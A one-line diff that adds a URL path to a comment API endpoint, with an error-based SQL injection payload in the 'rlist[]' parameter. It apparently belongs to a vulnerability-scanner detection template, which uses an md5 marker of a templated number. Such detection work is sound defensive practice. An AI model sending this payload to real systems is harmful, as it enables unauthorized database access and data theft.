@@ -1,0 +1,1 @@
+/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5({{num}})))),@`%27`
